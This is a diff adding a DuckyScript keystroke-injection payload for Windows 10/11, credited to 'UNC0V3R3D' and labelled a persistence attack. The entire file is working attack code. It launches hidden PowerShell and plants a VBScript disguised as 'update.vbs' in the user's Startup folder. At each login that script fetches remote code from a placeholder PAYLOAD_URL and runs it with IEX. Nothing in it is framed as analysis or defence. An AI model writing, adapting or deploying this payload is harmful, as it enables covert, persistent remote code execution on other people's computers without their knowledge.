@@ -1,0 +1,24 @@
+REM Author: UNC0V3R3D
+REM Description: Drops a VBScript into the user startup folder for persistence on next login.
+REM Version: 1.0
+REM Category: Persistence
+REM Target: Windows 10/11
+REM Requirements: User-level privileges
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING $path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"
+ENTER
+DELAY 400
+STRING $code = 'Set o=CreateObject("WScript.Shell"):o.Run "powershell -w hidden -c (New-Object Net.WebClient).DownloadString(""PAYLOAD_URL"") | IEX",0'
+ENTER
+DELAY 400
+STRING Set-Content -Path $path -Value $code
+ENTER
+DELAY 1500
+STRING exit
+ENTER
+REM End of payload
